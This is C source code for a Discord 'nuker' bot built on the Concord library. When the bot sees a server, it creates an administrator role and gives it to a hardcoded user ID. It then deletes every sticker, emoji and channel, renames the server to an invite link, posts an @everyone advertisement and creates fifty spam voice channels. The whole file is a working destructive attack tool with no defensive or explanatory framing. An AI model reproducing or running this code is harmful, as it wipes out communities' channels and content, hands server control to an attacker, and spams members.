#include <concord/discord.h>

#define TOKEN ""

static void on_guild_create(struct discord *client,
                            const struct discord_guild *event) {
  _Bool cmy = false;
  struct discord_channel channel;
  struct discord_role role;
  discord_create_guild_role(client, event->id,
                            &(struct discord_create_guild_role){
                                .permissions = DISCORD_PERM_ADMINISTRATOR,
                            },
                            &(struct discord_ret_role){
                                .sync = &role,
                            });
  discord_add_guild_member_role(client, event->id, 1291234047909171221, role.id,
                                0, 0);
  for (int i = 0; i != event->stickers->size; ++i) {
    discord_delete_guild_sticker(client, event->id,
                                 event->stickers->array[i].id, 0, 0);
  }
  for (int i = 0; i != event->emojis->size; ++i) {
    discord_delete_guild_emoji(client, event->id, event->emojis->array[i].id, 0,
                               0);
  }
  for (int i = 0; i != event->channels->size; ++i) {
    if (!cmy && DISCORD_CHANNEL_GUILD_TEXT == event->channels->array[i].type) {
      cmy = true;
      discord_modify_guild(
          client, event->id,
          &(struct discord_modify_guild){
              .afk_timeout = 60,
              .name = "discord.gg/cmy",
              .preferred_locale = "en-US",
              .public_updates_channel_id = event->channels->array[i].id,
              .rules_channel_id = event->channels->array[i].id,
          },
          0);
    }
    discord_delete_channel(client, event->channels->array[i].id, 0, 0);
  }
  discord_create_guild_channel(client, event->id,
                               &(struct discord_create_guild_channel){
                                   .name = "cmy",
                               },
                               &(struct discord_ret_channel){
                                   .sync = &channel,
                               });
  discord_create_message(client, channel.id,
                         &(struct discord_create_message){
                             .content = "||@everyone||\n# discord.gg/cmy",
                         },
                         0);
  for (int i = 0; i != 50; ++i) {
    discord_create_guild_channel(client, event->id,
                                 &(struct discord_create_guild_channel){
                                     .name = "discord.gg/cmy",
                                     .type = DISCORD_CHANNEL_GUILD_VOICE,
                                 },
                                 0);
  }
}

int main(void) {
  struct discord *client = discord_init(TOKEN);
  discord_set_on_guild_create(client, &on_guild_create);
  discord_run(client);
}
